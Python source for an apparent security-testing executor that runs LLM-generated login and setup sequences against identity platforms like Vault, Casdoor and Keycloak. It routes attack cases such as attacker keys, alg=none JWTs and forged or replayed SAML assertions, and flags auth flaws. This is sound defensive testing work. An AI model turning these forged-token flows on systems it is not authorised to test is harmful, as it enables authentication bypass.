"""Execute event sequences against a live platform instance."""
import json
import logging
import re
from typing import Any, Optional

import requests

from src.stateful.models import (
    Event, EventSequence, EventResult, SequenceResult, OracleCheck
)
from src.stateful.assertion_engine import AssertionEngine

logger = logging.getLogger(__name__)

import time as _time

def _set_nested(d: dict, key: str, value) -> None:
    """Set a value in a dict, unflattening dot-notation keys into nested dicts.

    _set_nested(d, "config.authorizationUrl", "https://...")
    → d["config"]["authorizationUrl"] = "https://..."

    Plain keys (no dots) are set directly: _set_nested(d, "alias", "x") → d["alias"] = "x"
    """
    parts = key.split(".")
    for part in parts[:-1]:
        d = d.setdefault(part, {})
    d[parts[-1]] = value


# Login event types (used to detect cross-mode)
_LOGIN_EVENT_TYPES = {"login_jwt", "login_with_jwt", "login_with_password"}

_EPOCH_TEMPLATE_RE = re.compile(
    # Matches LLM-invented time templates in any of the forms it tends to produce:
    #   {{now_epoch}}, {{now_epoch_plus_300}}, {{now_epoch_minus_60}}
    #   {{now}}, {{now_plus_300}}, {{now_minus_60}}
    #   {{now_plus_300s}}, {{now_minus_60s}}  (with trailing 's' suffix)
    #   {{time_now}}, {{time_now_plus_300s}}, {{time_now_minus_60s}}
    r'\{\{\s*(?:time_)?now(?:_epoch)?'
    r'(?:(?:_plus_|_\+_?|[+])(\d+)s?'
    r'|(?:_minus_|_-_?|[-])(\d+)s?)?'
    r'\s*\}\}',
    re.IGNORECASE,
)


def resolve_jwt_claim_templates(jwt_claims: dict) -> dict:
    """Resolve LLM-generated {{now_epoch}}-style templates in jwt_claims to integers.

    LLMs sometimes emit these placeholders because they have seen similar templating
    conventions in training data.  The executor never supported them, so string values
    in exp/iat/nbf cause Vault to reject the JWT with
    'expected number value to unmarshal NumericDate'.

    Only the three NumericDate fields (exp, iat, nbf) are rewritten; all other
    claims are returned unchanged.
    """
    def _resolve(v):
        if not isinstance(v, str):
            return v
        m = _EPOCH_TEMPLATE_RE.fullmatch(v.strip())
        if not m:
            return v
        now = int(_time.time())
        plus_secs = int(m.group(1)) if m.group(1) else 0
        minus_secs = int(m.group(2)) if m.group(2) else 0
        return now + plus_secs - minus_secs

    TIME_FIELDS = {"exp", "iat", "nbf"}
    return {k: (_resolve(v) if k in TIME_FIELDS else v) for k, v in jwt_claims.items()}


class SequenceExecutor:
    """Execute multi-step event sequences against a platform.

    Supports two modes (fixed at __init__ time):
      1. Legacy mode (vault_adapter + EVENT_REGISTRY): Vault-specific HTTP dispatch
      2. Profile mode (PlatformProfile): Protocol-abstracted execution via api_mapping

    Merged pipeline (Sprint 1-6):
      - login_* → VaultAdapter.authenticate() (Sprint 1)
      - login result → syntactic I1-I5 oracles (Sprint 3)
      - after all events → InvariantVerifier deep semantic (Sprint 6)
      - after all events → AssertionEngine LLM assertions (Sprint 6)
      - setup/verify → raw HTTP (admin ops, not in VaultAdapter)
    """

    def __init__(self,
                 vault_adapter=None,     # BrokerAdapter instance (kept for MutationSweep._run_login)
                 jwt_factory=None,
                 oracles: dict = None,
                 admin_token: str = "root",
                 profile=None,
                 protocol: str = "oidc_jwt",
                 public_key_pem: str = ""):
        self.adapter = vault_adapter
        self.jwt_factory = jwt_factory
        self.oracles = oracles or {}
        self.admin_token = admin_token
        self.profile = profile
        self.protocol = protocol
        self.public_key_pem = public_key_pem
        self.session = requests.Session()
        self.user_sessions: dict[str, requests.Session] = {}
        self.assertion_engine = AssertionEngine()
        self.mode = "profile"
        self._platform_initializer = None  # lazy-init in _ensure_admin_session

        # Initialize SAML factory for platforms supporting SAML
        self._saml_factory = None
        self._attacker_saml_factory = None
        if profile and "saml" in (profile.supported_protocols or []):
            from src.utils.saml_factory import SAMLFactory
            self._saml_factory = SAMLFactory()
            self._attacker_saml_factory = SAMLFactory()

        # base_url: profile takes priority, then adapter, then default
        if profile is not None:
            self.base_url = profile.base_url.rstrip("/")
        elif vault_adapter is not None:
            self.base_url = vault_adapter.base_url.rstrip("/")
        else:
            self.base_url = "http://localhost:8200"

        # Key registry: maps _signing_key_hint labels to (private_key, public_key_pem).
        # Enables testing key rotation, attacker keys, and alg=none scenarios.
        # The "default" key is the campaign's trusted key pair.
        self._key_registry: dict[str, tuple] = {}
        if jwt_factory and public_key_pem:
            self._key_registry["default"] = (jwt_factory._private_key, public_key_pem)

        # Platform-setup values that survive across sequence resets
        self._persistent_captures = {}
        # Runtime state (reset on each execute() call)
        self.captures = {}
        self.tokens = {}
        self.cleanup_actions = []
        self.syntactic_verdicts = []

    def execute(self, seq: EventSequence) -> SequenceResult:
        """Execute all events in a sequence, then run three-layer oracle verification."""
        # Preserve platform-setup values (client_id, redirect_uri, etc.)
        # across sequence resets so every sequence can use them.
        _persistent = getattr(self, '_persistent_captures', {})
        self.captures = dict(_persistent)
        # Also seed captures from environment_defaults so {{mock_idp_issuer}}
        # and similar template variables resolve in _resolve_params.
        if self.profile and self.profile.environment_defaults:
            for k, v in self.profile.environment_defaults.items():
                if isinstance(v, str) and k not in self.captures:
                    self.captures[k] = v
        self.tokens = {}
        self.cleanup_actions = []
        self.syntactic_verdicts = []
        self._current_realm = None  # Track realm from login events for verify events
        # Invalidate cached admin token so each sequence gets a fresh one
        if hasattr(self, '_cached_admin_token'):
            del self._cached_admin_token
        event_results = []

        # Ensure verify events have standard captures for InvariantVerifier
        seq = self._ensure_verify_captures(seq)

        logger.info(f"=== Executing sequence: {seq.sequence_id} ===")
        logger.info(f"    {seq.description}")
        logger.info(f"    Invariant: {seq.primary_invariant}")
        logger.info(f"    Events: {len(seq.events)}")
        logger.info(f"    Mode: {self.mode}")

        self._current_sequence_events = seq.events
        self._current_sequence_id = seq.sequence_id
        for i, event in enumerate(seq.events):
            # Infer phase if not set
            if not event.phase:
                event.phase = self._infer_phase(event)
            logger.info(f"  [{i+1}/{len(seq.events)}] [{event.phase}] {event.event_type} (auth_as={event.auth_as})")
            result = self._execute_event(event)
            event_results.append(result)

            if result.captured_values:
                logger.info(f"    Captured: {list(result.captured_values.keys())}")

            # Abort on critical setup failure — user/identity creation failures make
            # subsequent login events impossible. Non-critical setup failures
            # (policy, role, group) are logged but execution continues.
            is_setup = event.event_type.startswith("setup_") or event.phase == "setup"
            is_critical_setup = event.event_type in (
                "create_identity_user", "create_user", "modify_identity_user",
                "mfa_setup_enable", "create_realm",
            )
            if is_setup and not result.success:
                logger.error(f"    Setup failed [{event.event_type}]: {result.error}")
                # Track group/alias/policy setup failures for oracle precondition checks.
                # These are non-critical but cause I3/I5 assertions to fail vacuously.
                _group_policy_events = (
                    "create_identity_group", "create_group_alias",
                    "get_mount_accessor", "attach_policy",
                )
                if event.event_type in _group_policy_events:
                    _fail_key = f"__setup_failed_{event.event_type}"
                    self.captures[_fail_key] = True
                    logger.info(
                        f"    [SETUP-TRACK] {event.event_type} failed — "
                        f"subsequent group-derived assertions may be INCONCLUSIVE"
                    )

            if (result.success
                    and event.event_type == "create_provider"
                    and self.profile and self.profile.name == "casdoor"
                    and event.params.get("category", "").upper() == "SAML"):
                prov_name = event.params.get("name", "")
                if prov_name:
                    # Link provider to ALL apps created in this sequence
                    _app_names = set()
                    for prev_ev in seq.events[:i]:
                        if prev_ev.event_type == "create_application":
                            _n = prev_ev.params.get("name", "")
                            if _n:
                                _app_names.add(_n)
                    # Always include app-test as fallback
                    _app_names.add("app-test")
                    for _app_name in _app_names:
                        try:
                            self._ensure_admin_session()
                            ar = self.session.get(
                                f"{self.base_url}/api/get-application",
                                params={"id": f"admin/{_app_name}"}, timeout=10)
                            app_data = ar.json().get("data")
                            if isinstance(app_data, dict):
                                providers = app_data.get("providers") or []
                                existing = [p.get("name") for p in providers if isinstance(p, dict)]
                                if prov_name not in existing:
                                    providers.append({
                                        "name": prov_name,
                                        "canSignUp": True, "canSignIn": True, "canUnlink": True,
                                    })
                                    app_data["providers"] = providers
                                    self.session.post(
                                        f"{self.base_url}/api/update-application",
                                        params={"id": f"admin/{_app_name}"},
                                        json=app_data, timeout=15)
                                    logger.info(f"    CASDOOR: auto-linked provider '{prov_name}' to app '{_app_name}'")
                        except Exception as e:
                            logger.warning(f"    CASDOOR: auto-link provider failed: {e}")

            # Track successful modify_role_config events for I5 precondition checks.
            # When an admin explicitly modifies role config (e.g., empties bound_claims),
            # subsequent access broadening is BY_DESIGN, not a vulnerability.
            if event.event_type == "modify_role_config" and result.success:
                self.captures["__modify_role_succeeded"] = True
                _bound_claims = event.params.get("bound_claims")
                if _bound_claims is not None and (
                    _bound_claims == {} or _bound_claims == "" or _bound_claims == []
                ):
                    self.captures["__modify_emptied_bound_claims"] = True
                    logger.info(
                        "    [MODIFY-TRACK] modify_role_config emptied bound_claims"
                    )
                if is_critical_setup:
                    self._cleanup()
                    return SequenceResult(
                        sequence=seq, event_results=event_results,
                        status="SETUP_FAILED", captured_state=dict(self.captures)
                    )

            # Record login success/failure in captures for AssertionEngine
            if (event.event_type.startswith("login_")
                    or event.event_type in ("saml_login", "token_exchange")):
                self.captures[f"{event.auth_as}_login_success"] = result.success
                self.captures[f"{event.auth_as}_login_status"] = result.http_status
                # Alias: LLMs sometimes reference _login_http_status instead of _login_status
                self.captures[f"{event.auth_as}_login_http_status"] = result.http_status

                # HTTP 5xx from a login endpoint is always a server bug — report immediately.
                # The server should return 4xx for invalid input, never crash.
                if result.http_status >= 500:
                    from src.models.types import Verdict, VerdictType
                    error_msg = result.error or ""
                    if isinstance(error_msg, list):
                        error_msg = "; ".join(str(e) for e in error_msg)
                    self.syntactic_verdicts.append(Verdict(
                        invariant="I1",
                        verdict_type=VerdictType.VIOLATION,
                        confidence="HIGH",
                        description=(
                            f"Server returned HTTP {result.http_status} on {event.event_type} "
                            f"(auth_as={event.auth_as}): {str(error_msg)[:200]}. "
                            f"Login endpoints must not return 5xx for any input."
                        ),
                        evidence={
                            "event_type": event.event_type,
                            "http_status": result.http_status,
                            "error": str(error_msg)[:500],
                            "params_keys": list(event.params.keys()),
                        },
                        spec_reference="RFC 7231 Section 6.6: 5xx indicates server failure",
                    ))

                # Track realm for subsequent verify events
                if result.success:
                    realm = (event.params.get("realm") or event.params.get("realm-name")
                             or event.params.get("realm_name"))
                    if realm:
                        self._current_realm = realm

        # OIDC source issuer-mismatch detection: if the OIDC source redirect
        # login succeeded despite the id_token issuer not matching the source's
        # configured URL, emit a syntactic verdict. This is a generic check —
        # any platform where verify_iss is disabled gets flagged.
        if self.captures.get("_oidc_source_issuer_mismatch") == "true":
            from src.models.types import Verdict, VerdictType
            self.syntactic_verdicts.append(Verdict(
                invariant="I1",
                verdict_type=VerdictType.UNEXPECTED,
                confidence="MEDIUM",
                description=(
                    "OIDC source login succeeded despite id_token issuer mismatch: "
                    "the IdP returned an id_token with a different issuer than the "
                    "source's configured OIDC well-known URL. This indicates the SP "
                    "does not validate the iss claim per OIDC Core 3.1.3.7 Section 2."
                ),
                evidence={
                    "oidc_source_issuer_mismatch": True,
                    "captures": {k: str(v)[:100] for k, v in self.captures.items()
                                 if "source" in k or "issuer" in k or "oidc" in k},
                },
                cve_pattern="",
                requires_manual_review=True,
            ))
            logger.info("  [SYNTACTIC] I1 UNEXPECTED: OIDC source issuer mismatch detected")

        # Run three-layer oracle pipeline
        all_verdicts, result_universal_contexts = self._run_oracle_pipeline(seq, event_results)

        self._cleanup()

        return SequenceResult(
            sequence=seq, event_results=event_results,
            verdicts=all_verdicts, status="COMPLETED",
            captured_state=dict(self.captures),
            universal_contexts=result_universal_contexts,
        )

    def _run_oracle_pipeline(self, seq: EventSequence, event_results: list) -> tuple:
        """Run L1 + L2 + L3 oracle verification and return tagged verdicts.

        Returns (all_verdicts, universal_contexts).
        """
        # Layer 1: Syntactic oracles (accumulated during login execution)
        all_verdicts = list(self.syntactic_verdicts)
        for v in all_verdicts:
            v.detection_source = "L1_syntactic"

        # Layer 2: PlatformVerifier with universal contexts
        from src.stateful.platform_verifier import PlatformVerifier
        from src.filters.known_behavior_filter import KnownBehaviorFilter
        pv = PlatformVerifier(profile=self.profile)
        kbf = KnownBehaviorFilter.from_profile(self.profile) if self.profile else None
        universal_contexts = self._build_universal_contexts(
            seq.events, event_results
        )
        pv_all = []
        for uctx in universal_contexts:
            pv_all.extend(pv.verify_login(uctx))
        if len(universal_contexts) >= 2:
            pv_all.extend(pv.verify_cross_user(
                universal_contexts, sequence_events=seq.events
            ))
        if kbf and pv_all:
            pv_all = kbf.filter_verdicts(pv_all, {"platform": self.profile.name})
        for v in pv_all:
            v.detection_source = "L2_platform_verifier"
        all_verdicts.extend(pv_all)

        # Layer 3: AssertionEngine (LLM-written oracle assertions)
        self._current_seq_events = seq.events
        l3_verdicts = self._run_oracle_checks(seq.oracle_checks)
        for v in l3_verdicts:
            v.detection_source = "L3_assertion"
        all_verdicts.extend(l3_verdicts)
        self._current_seq_events = None

        return all_verdicts, universal_contexts

    # ------------------------------------------------------------------
    # Event execution routing (mode fixed at init)
    # ------------------------------------------------------------------

    def _infer_phase(self, event: Event) -> str:
        """Infer event phase if not explicitly set."""
        if event.phase:
            return event.phase
        if event.event_type.startswith("login_"):
            return "login"
        if event.event_type.startswith("verify_") or event.event_type.startswith("read_"):
            return "verify"
        if event.event_type.startswith("introspect_"):
            return "verify"
        return "setup"

    def _execute_event(self, event: Event) -> EventResult:
        """Execute a single event via profile mode."""
        return self._execute_profile_event(event)


    def _execute_profile_event(self, event: Event) -> EventResult:
        """Profile mode: dispatch via PlatformProfile API mapping."""
        # test_request_object: always dispatch to dedicated handler that constructs
        # the alg=none JWT. Must check BEFORE profile endpoint lookup because
        # prompt_builder injects a synthetic endpoint for prompt generation only.
        if event.event_type == "test_request_object":
            return self._execute_test_request_object(event)
        # approve_device: OAuth 2.0 device authorization user-approval step.
        # Dispatched BEFORE profile endpoint lookup because it drives a multi-step
        # HTML consent flow (login form -> device-grant accept) that the generic
        # JSON/response_map executor cannot express. Only fires for this new
        # event_type, so existing sequences/profiles are unaffected.
        if event.event_type == "approve_device":
            return self._handle_approve_device(event)
        endpoint = self.profile.get_endpoint(self.protocol, event.event_type)
        # Fallback: saml_login events may be defined under the 'saml' protocol
        # even when the campaign runs in oidc_jwt mode (cross-protocol testing).
        if endpoint is None and event.event_type == "saml_login" and self.protocol != "saml":
            endpoint = self.profile.get_endpoint("saml", event.event_type)
        if endpoint is None:
            return EventResult(
                event=event,
                error=f"No API mapping for '{event.event_type}' on {self.profile.name}/{self.protocol}"
            )

        try:
            resolved_params = self._resolve_params(event.params)

            # Profile mode login: dispatch by login_strategy.
            is_login = (event.event_type.startswith("login_")
                        or event.event_type in ("saml_login", "token_exchange"))
            strategy = (self.profile.login_strategy if self.profile else "") or ""
            if not strategy:
                strategy = "jwt_factory" if self.jwt_factory else "http"

            # Experience API login: platforms without ROPC support use multi-step
            # OIDC interaction flow for password and SSO authentication.
            _ep_meta = (getattr(endpoint, 'metadata', {}) or {}) if endpoint else {}
            _needs_experience = (
                is_login
                and event.event_type == "login_with_password"
                and (_ep_meta.get("documented_as_experience_api_only")
                     or _ep_meta.get("absent_canonical_login"))
            )
            # SSO Experience login: only for saml_login events that represent
            # legitimate SSO authentication (not attack scenarios like forged
            # signatures, replays, or manipulated assertions). Attack events
            # should go through _execute_profile_http → _build_saml_login_response.
            _is_sso_capable = (
                is_login
                and event.event_type == "saml_login"
                and _ep_meta.get("initiate_saml_flow")
                and self.profile
                and self.profile.environment_defaults
                and self.profile.environment_defaults.get("sso_connector_setup_note")
            )
            # Detect SAML assertion-level attacks that require direct POST
            # (forged signatures, replayed assertions, expired assertions).
            # Do NOT include "attacker" in auth_as — an attacker using a
            # legitimate SSO flow (e.g., unverified-email linking) must go
            # through the Experience API, not the direct SAML POST path.
            _is_attack_saml = (
                event.expected_outcome == "failure"
                or "replay" in event.auth_as.lower()
                or "forged" in event.auth_as.lower()
                or "expired" in event.auth_as.lower()
                or resolved_params.get("use_attacker_key")
                or resolved_params.get("saml_mutation")
            )
            _needs_sso_experience = _is_sso_capable and not _is_attack_saml

            if _needs_experience:
                result = self._experience_api_login(event, endpoint, resolved_params)
            elif _needs_sso_experience:
                _connector_id = (
                    resolved_params.get("connector_id")
                    or resolved_params.get("saml_sso_connector_id")
                    or resolved_params.get("oidc_sso_connector_id")
                )
                if not _connector_id:
                    # Alternate between SAML and OIDC SSO connectors when both
                    # are available. This exercises both SSO code paths without
                    # requiring profile changes.
                    _saml_cid = self.captures.get("saml_sso_connector_id", "")
                    _oidc_cid = self.captures.get("oidc_sso_connector_id", "")
                    if _saml_cid and _oidc_cid:
                        _seq_hash = hash(getattr(self, '_current_sequence_id', '') + event.auth_as)
                        _connector_id = _oidc_cid if _seq_hash % 2 == 0 else _saml_cid
                    else:
                        _connector_id = _saml_cid or _oidc_cid
                if _connector_id:
                    result = self._experience_sso_login(
                        event, endpoint, resolved_params, _connector_id)
                else:
                    result = self._execute_profile_http(event, endpoint, resolved_params)
            elif is_login and strategy == "jwt_factory" and self.jwt_factory:
                result = self._execute_profile_login(event, endpoint, resolved_params)
            else:
                result = self._execute_profile_http(event, endpoint, resolved_params)

            # Auto-retry create_identity_user on "already exists": delete the
            # leftover resource and re-create.  This handles stale resources
            # that survived cleanup (e.g., pagination edge cases, partial
            # cleanup failures).
            if (not result.success
                    and event.event_type in ("create_identity_user", "create_user")
                    and "already exists" in str(result.error).lower()):
                logger.info(f"    RETRY: '{event.event_type}' hit 'already exists', deleting and retrying")
                self._delete_existing_resource(event, resolved_params)
                result = self._execute_profile_http(event, endpoint, resolved_params)
                if result.success:
                    logger.info(f"    RETRY: succeeded after delete-and-recreate")

            # Debug: log response structure for login events
            if event.event_type.startswith("login_"):
                logger.info(f"    LOGIN response_body keys: {list(result.response_body.keys()) if isinstance(result.response_body, dict) else type(result.response_body)}")
                if isinstance(result.response_body, dict) and "auth" in result.response_body:
                    logger.info(f"    LOGIN auth keys: {list(result.response_body['auth'].keys())}")
                logger.info(f"    LOGIN success: {result.success}, http_status: {result.http_status}")
                if not result.success:
                    logger.info(f"    LOGIN error: {result.error}")
                    logger.info(f"    LOGIN response_body: {str(result.response_body)[:500]}")

            # Apply event-level captures
            captured = {}
            for var_name, json_path in event.captures.items():
                if json_path in ("http_status", "_http_status"):
                    value = result.http_status
                else:
                    value = self._extract_accessor_or_path(
                        result.response_body, json_path, resolved_params
                    )
                    # Fallback: if extraction returned None, check if a
                    # response_map abstract key with the same name was
                    # already stored in captures (e.g. "minted_token"
                    # extracted via response_map from "token" in body).
                    if value is None and json_path in self.captures:
                        value = self.captures[json_path]
                logger.info(f"    CAPTURE: {var_name} = extract({json_path!r}) → {value!r}")
                captured[var_name] = value
                # Don't overwrite existing non-None captures with None
                # (e.g., JWT-extracted roles shouldn't be replaced by missing userinfo fields)
                if value is not None or var_name not in self.captures:
                    self.captures[var_name] = value

            # Auto-parse URL query parameters from captured auth_url values.
            # When start_idp_intent returns auth_url, the LLM needs authRequestID
            # and userAgentID as separate captures for complete_jwt_idp_login.
            for var_name, value in list(captured.items()):
                if isinstance(value, str) and "?" in value and ("url" in var_name.lower() or "auth_url" in var_name):
                    from urllib.parse import urlparse, parse_qs
                    _qs = parse_qs(urlparse(value).query)
                    for qk, qv in _qs.items():
                        _cap_name = f"{var_name}_{qk}"
                        _cap_val = qv[0] if qv else ""
                        if _cap_val and _cap_name not in self.captures:
                            self.captures[_cap_name] = _cap_val
                            logger.info(f"    AUTO-URL-PARSE: {_cap_name} = {_cap_val[:30]}...")

            # Store session token from ANY event that has session_token in response_map.
            # This handles login_*, saml_login, obtain_pat_client_credentials, obtain_rpt_uma_ticket, etc.
            # Also treat start_oidc_auth as a login-like event when it returns an auth_code
            is_login = (event.event_type.startswith("login_")
                        or event.event_type == "saml_login"
                        or (event.event_type == "start_oidc_auth"
                            and isinstance(result.response_body, dict)
                            and result.response_body.get("auth_code")))
            has_session_token_map = (
                endpoint and endpoint.response_map
                and "session_token" in endpoint.response_map
            )
            if (is_login or has_session_token_map) and result.success:
                # Get session token path from profile's response_map
                session_token_path = "auth.client_token"  # fallback default
                if endpoint and endpoint.response_map:
                    session_token_path = endpoint.response_map.get(
                        "session_token", session_token_path
                    )
                client_token = self._extract_json_path(result.response_body, session_token_path)
                # SAML callback redirect capture: the redirect-chain handler
                # returns {"auth_code": "xxx"} when it extracts a code from the
                # Location header.  Use auth_code as the session token so the
                # auto-exchange logic below can convert it to an access token.
                if not client_token and isinstance(result.response_body, dict):
                    client_token = result.response_body.get("auth_code")
                if client_token:
                    self.tokens[f"session_{event.auth_as}"] = client_token
                    logger.info(f"    TOKEN STORED: session_{event.auth_as} = {str(client_token)[:30]}...")
                    # Profile mode: use profile's revoke_session endpoint if available
                    revoke_ep = self.profile.get_endpoint(self.protocol, "revoke_session")
                    if revoke_ep:
                        self.cleanup_actions.append(
                            (revoke_ep.method, revoke_ep.path, {"token": client_token})
                        )
                    # If no revoke endpoint in profile, skip — some platforms auto-expire

                    # Also store in captures for assertion references (e.g., rpt_token)
                    for cap_name, cap_path in event.captures.items():
                        if cap_path == "session_token":
                            self.captures[cap_name] = client_token
                            logger.info(f"    CAPTURE (session_token): {cap_name} = {str(client_token)[:30]}...")
                else:
                    _resp_status = result.response_body.get("status", "?") if isinstance(result.response_body, dict) else "?"
                    _resp_msg = str(result.response_body.get("msg", ""))[:120] if isinstance(result.response_body, dict) else ""
                    _resp_data = repr(result.response_body.get("data", None))[:60] if isinstance(result.response_body, dict) else "?"
                    logger.error(f"    ⚠️ NO TOKEN EXTRACTED for session_{event.auth_as} "
                                 f"(status={_resp_status}, data={_resp_data}, msg={_resp_msg})")

                # Auto-exchange auth code for access token when login returns
                # an auth code from login_with_password(type=code) and saml_login
                # that must be exchanged via the token endpoint before verify works.
                # Auth codes are short hex/alphanumeric strings without "/" or "."
                # Session paths (e.g. "built-in/admin") contain "/" and are NOT codes
                _ct = str(client_token)
                is_auth_code = (
                    client_token
                    and "." not in _ct
                    and "/" not in _ct
                    and len(_ct) < 64
                    and len(_ct) >= 10
                )
                if is_auth_code:
                    exchange_ep = self.profile.get_endpoint(self.protocol, "exchange_code_for_token")
                    logger.info(f"    AUTH-CODE detected ({str(client_token)[:20]}...), exchange_ep={'found' if exchange_ep else 'MISSING'}")
                    if exchange_ep:
                        try:
                            # Build exchange body from endpoint default_params + resolved params
                            _exc_defaults = getattr(exchange_ep, 'default_params', {}) or {}
                            _exc_body = {
                                "grant_type": "authorization_code",
                                "code": client_token,
                            }
                            # Use defaults from the exchange endpoint (client_id, client_secret, redirect_uri)
                            for k, v in _exc_defaults.items():
                                if k not in _exc_body:
                                    _exc_body[k] = v
                            # Override with resolved params if available
                            for k in ("client_id", "client_secret", "redirect_uri"):
                                if k in resolved_params and resolved_params[k]:
                                    _exc_body[k] = resolved_params[k]
                            # Fallback to persistent captures (setup-created real values)
                            _pc = getattr(self, '_persistent_captures', {})
                            for k in ("client_id", "redirect_uri"):
                                if _pc.get(k):
                                    _exc_body[k] = _pc[k]
                            # Then environment_defaults as final fallback
                            _env_defs = getattr(self.profile, 'environment_defaults', {}) or {} if self.profile else {}
                            for k in ("client_id", "client_secret", "redirect_uri"):
                                if k not in _exc_body or not _exc_body[k]:
                                    if _env_defs.get(k):
                                        _exc_body[k] = _env_defs[k]

                            # (LLMs often provide fake values that cause exchange failure)
                            if self.profile and self.profile.name == "casdoor":
                                self._ensure_admin_session()
                                # Find the right app: from sequence, then fallback to app-test
                                _app_name = resolved_params.get("application", "")
                                if not _app_name:
                                    for _prev in (getattr(self, '_current_sequence_events', None) or []):
                                        if _prev.event_type == "create_application":
                                            _app_name = _prev.params.get("name", "")
                                if not _app_name:
                                    _app_name = "app-test"
                                app_r = self.session.get(
                                    f"{self.base_url}/api/get-application",
                                    params={"id": f"admin/{_app_name}"}, timeout=10
                                )
                                app_d = app_r.json().get("data")
                                if not app_d or not isinstance(app_d, dict):
                                    # App doesn't exist, fallback to app-test
                                    app_r = self.session.get(
                                        f"{self.base_url}/api/get-application",
                                        params={"id": "admin/app-test"}, timeout=10
                                    )
                                    app_d = app_r.json().get("data", {})
                                if isinstance(app_d, dict) and app_d.get("clientId"):
                                    _exc_body["client_id"] = app_d["clientId"]
                                    _exc_body["client_secret"] = app_d.get("clientSecret", "")
                                    _exc_body.setdefault(
                                        "redirect_uri",
                                        (app_d.get("redirectUris") or ["http://localhost:8000/callback"])[0]
                                    )

                            exc_r = requests.post(
                                f"{self.base_url}{exchange_ep.path}",
                                data=_exc_body,
                                timeout=15,
                            )
                            try:
                                exc_data = exc_r.json()
                            except Exception:
                                exc_data = dict(
                                    x.split("=", 1) for x in exc_r.text.split("&") if "=" in x
                                ) if "=" in exc_r.text else {}
                            access_token = exc_data.get("access_token")
                            if access_token:
                                self.tokens[f"session_{event.auth_as}"] = access_token
                                logger.info(f"    AUTO-EXCHANGE: code→token for {event.auth_as} = {str(access_token)[:40]}...")
                                # Update captures that referenced session_token
                                for cap_name, cap_path in event.captures.items():
                                    if cap_path == "session_token":
                                        self.captures[cap_name] = access_token
                                client_token = access_token  # for JWT claim extraction below
                            else:
                                logger.warning(f"    AUTO-EXCHANGE: no access_token in response: {str(exc_data)[:200]}")
                        except Exception as e:
                            logger.warning(f"    AUTO-EXCHANGE failed: {e}")

                # Extract claims from JWT access token (roles, groups, etc. not in userinfo)
                if client_token:
                    self._extract_jwt_claims(event.auth_as, client_token)

            # Auto-capture response_map values with auth_as prefix (safety net).
            # Runs for ALL login/saml_login events regardless of success so that
            # assertion variables like user_saml_seq2_status are always populated.
            if (is_login or has_session_token_map) and endpoint and endpoint.response_map:
                prefix = event.auth_as  # e.g. "user_A" or "pat_client"
                for abstract_key, json_path in endpoint.response_map.items():
                    prefixed_key = f"{prefix}_{abstract_key}"
                    if prefixed_key not in self.captures:  # Don't overwrite event-level captures
                        value = self._extract_json_path(result.response_body, json_path)
                        if value is not None:
                            self.captures[prefixed_key] = value
                            logger.info(f"    AUTO-CAPTURE (login): {prefixed_key} = {value!r}")

            # Auto-capture response_map values for verify events with auth_as prefix
            if event.event_type.startswith("verify_") and result.success and endpoint and endpoint.response_map:
                prefix = event.auth_as.replace("session_", "")  # "session_user_A" → "user_A"
                for abstract_key, json_path in endpoint.response_map.items():
                    prefixed_key = f"{prefix}_{abstract_key}"
                    if prefixed_key not in self.captures:
                        value = self._extract_json_path(result.response_body, json_path)
                        if value is not None:
                            self.captures[prefixed_key] = value
                            logger.info(f"    AUTO-CAPTURE (verify): {prefixed_key} = {value!r}")

            result.captured_values = captured
            return result

        except Exception as e:
            logger.error(f"Profile event execution error: {e}", exc_info=True)
            return EventResult(event=event, error=str(e))

    def _execute_profile_http(self, event: Event, endpoint, resolved_params: dict) -> EventResult:
        """Generic HTTP executor using endpoint definition from PlatformProfile."""
        # Normalize param aliases so event params match path/body_map expectations
        param_aliases = {"realm_name": "realm", "realm-name": "realm", "realmName": "realm",
                         "role": "role_name", "group": "group_name"}
        for alias, canonical in param_aliases.items():
            if alias in resolved_params and canonical not in resolved_params:
                resolved_params[canonical] = resolved_params[alias]

        # Auto-inject realm from most recent login if not in params
        if "{realm}" in (endpoint.path or "") and "realm" not in resolved_params:
            if hasattr(self, '_current_realm') and self._current_realm:
                resolved_params["realm"] = self._current_realm

        if event.event_type == "create_user" and "password" in resolved_params:
            if "credentials" not in resolved_params:
                resolved_params["credentials"] = [{
                    "type": "password",
                    "value": resolved_params["password"],
                    "temporary": False,
                }]

        # Merge default_params from profile endpoint (generic, not platform-specific)
        if hasattr(endpoint, 'default_params') and endpoint.default_params:
            for k, v in endpoint.default_params.items():
                if k not in resolved_params or not resolved_params[k]:
                    resolved_params[k] = v

        if event.event_type == "login_with_password" and "grant_type" not in resolved_params:
            resolved_params["grant_type"] = "password"
        if event.event_type.startswith("login_") and "scope" not in resolved_params:
            resolved_params["scope"] = "openid"

        # Also resolve when user_id is "None" (string) from unresolved template captures
        _uid = resolved_params.get("user_id")
        _uid_missing = (
            "{user_id}" in endpoint.path
            and (not _uid or str(_uid) in ("None", "null", ""))
        )
        if _uid_missing:
            user_id = self._resolve_keycloak_user_id(resolved_params)
            if user_id:
                resolved_params["user_id"] = user_id

        # Resolve path parameters
        path = endpoint.path
        for key, value in resolved_params.items():
            # Strip trailing slashes from mount values to prevent double-slash URLs.
            # LLMs sometimes emit mount="jwt/" which produces /v1/auth/jwt//config (broken).
            v_str = str(value).rstrip('/') if key == 'mount' else str(value)
            path = path.replace(f"{{{key}}}", v_str)

        # Fallback: replace unresolved path placeholders with protocol defaults
        if "{mount}" in path:
            default_mount = {"oidc_jwt": "jwt", "saml": "saml"}.get(self.protocol, "jwt")
            path = path.replace("{mount}", default_mount)
        if "{realm}" in path:
            path = path.replace("{realm}", "valence-test")

        # Allow endpoints to target a different base URL (e.g. mock-idp on :9090)
        _endpoint_meta = getattr(endpoint, 'metadata', {}) or {}
        _base = _endpoint_meta.get("base_url_override", self.base_url)
        url = f"{_base}{path}"

        # Read-modify-write pattern: for APIs that require the full object,
        # GET the current state and merge the requested changes before POSTing.
        read_path = getattr(endpoint, 'metadata', {}).get("read_before_write") if hasattr(endpoint, 'metadata') else None
        if read_path:
            body = self._read_modify_write(read_path, resolved_params, endpoint)
            if body is None:
                # Fallback to normal body building if read failed
                body = {}
                for abstract_name, platform_name in endpoint.body_map.items():
                    if abstract_name in resolved_params:
                        _set_nested(body, platform_name, resolved_params[abstract_name])
        else:
            # Build request body by mapping abstract params to platform params
            body = {}
            for abstract_name, platform_name in endpoint.body_map.items():
                if abstract_name in resolved_params:
                    _set_nested(body, platform_name, resolved_params[abstract_name])

        # Pass-through: LLMs sometimes emit the platform field name (e.g.
        # "bound_audiences") instead of the abstract name ("audience_restriction").
        # If a resolved param matches a known platform field name but was NOT
        # already mapped via an abstract key, include it directly in the body.
